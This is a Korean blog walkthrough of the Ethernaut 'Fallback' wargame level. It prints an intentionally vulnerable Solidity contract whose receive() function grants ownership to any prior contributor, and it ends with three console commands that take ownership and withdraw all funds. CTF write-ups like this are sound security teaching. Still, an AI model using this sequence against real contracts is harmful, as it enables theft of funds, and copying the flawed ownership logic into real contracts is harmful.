+++
title = "Fallback"
description = "Ethernaut: Fallback"
date = 2023-03-22

[taxonomies]
categories = ["Ethernaut"]
tags = ["Solidity", "fallback", "ethernaut"]

[extra]
math=true
+++

---

# 문제 설명
<details>
<summary>전체 코드</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

</details>

- `Fallback` contract 는 자신에게 돈을 보낸 사람들의 정보를 기록합니다.
- 재밌는 부분은 주인보다 더 많이 <mark>contribute</mark> 하면 주인이 될 수도 있다는 점입니다.

---

- 문제를 해결하기 위한 조건은 아래 두 가지 입니다.
  - ***contract 의 주인이 될 것***
  - ***contract 가 갖고 있는 돈이 0원일 것***
- 쉽게 말해, <u>*contract 주인이 되어서 보관된 돈을 다 빼오는게*</u> 목표입니다.

---

- <mark>Hint</mark>로 아래 세 가지를 생각해 볼 것을 제안합니다.
  - *ether* 를 보내는 방법
  - *wei* 단위와 *ether* 단위로 서로 변환하는 방법
  - Fallback method

---

# 문제 분석

- 코드를 자세히 살펴보겠습니다.
- 우선 contract 가 생성될 때 한번 호출되는 <mark>constructor()</mark> 함수가 아래와 같습니다.

```solidity
constructor() {
  owner = msg.sender;
  contributions[msg.sender] = 1000 * (1 ether);
}
```

- 그리고, <mark>contribute()</mark> 함수가 아래와 같습니다.

```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value;
  if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
  }
}
```

- *contribute* 는 한 번 할 때, `0.001 eth` 미만의 값만 가능합니다. 
- 주인이 되기 위해선, 현재 주인의 contribute 값인 `1000 eth` 보다 값이 높아져야 합니다.
- 따라서, <mark>contribute()</mark> 를 통해 주인이 되는 것은 (가능은 하지만) 너무 어려운 길입니다..
- 다행히 주인이 되는 방법이 한가지 더 있는데, 바로 <mark>receive()</mark> 함수를 이용하는 것입니다.
> - <mark>receive()</mark> 함수에 대한 정보는 [Docs](https://docs.soliditylang.org/en/v0.8.17/contracts.html#receive-ether-function) 참조

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

- 아무런 function call 없이, 단순히 contract 에 돈을 보내려 하면 <mark>receive()</mark> 에 정의된 대로 동작이 일어난다고 합니다.
- 따라서, 아래와 같은 절차로 문제를 해결할 수 있음을 알 수 있습니다.
> - <mark>contribute()</mark> 로 돈을 `0.0005 eth` 보냅니다.
> - contract 로 `0.0001 eth` 를 ***그냥*** 송금하는 tx 를 보냅니다.
>   - 이 때, contract의 주인이 됩니다.
> - <mark>withdraw()</mark> 로 돈을 다 빼옵니다.

---

# 문제 풀이
- 아래 순서대로 Dev Tool의 Console 에서 입력하면 된다.

```js
// `0.0005 eth` 담아서 contribute 하기
contract.contribute({value: toWei("0.0005")})

// `0.0001 eth` 그냥 보내기
contract.sendTransaction({value: toWei("0.0001")})

// 돈 다 빼오기
contract.withdraw()
```

---
